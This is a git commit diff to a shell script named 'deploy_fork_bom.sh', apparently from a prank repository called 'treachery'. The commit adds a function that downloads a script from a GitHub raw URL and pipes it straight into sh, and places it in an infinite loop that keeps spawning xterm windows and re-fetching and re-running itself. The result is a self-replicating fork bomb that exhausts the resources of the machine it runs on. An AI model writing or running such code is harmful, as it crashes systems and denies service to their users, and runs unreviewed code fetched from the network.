ec80cac094a0ad014292f2aa8f3aade7e6c7245d
Mats De Beer <mde-beer@f1r4s17.codam.nl>
2024-11-12 13:21:59 +0100

    updated fork bom to use webrun

--- assorted/forked_bom/deploy_fork_bom.sh
+++ assorted/forked_bom/deploy_fork_bom.sh
@@ -1,14 +1,19 @@
 #!/bin/sh
 
+location='https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/forked_bom/deploy_fork_bom.sh'
+
 bom(){
 	xterm -hold -title 'lmao get forked' -mesg -geometry 126x71 -e curl https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/forked_bom/fork
+}
+webrun(){
+	wget -qO - $1 | sh
 }
 
 deploy(){	
 	while :
 		do 
 			bom
-			./deploy_fork_bom.sh &
+			webrun ${location} &
 		done
 }
 
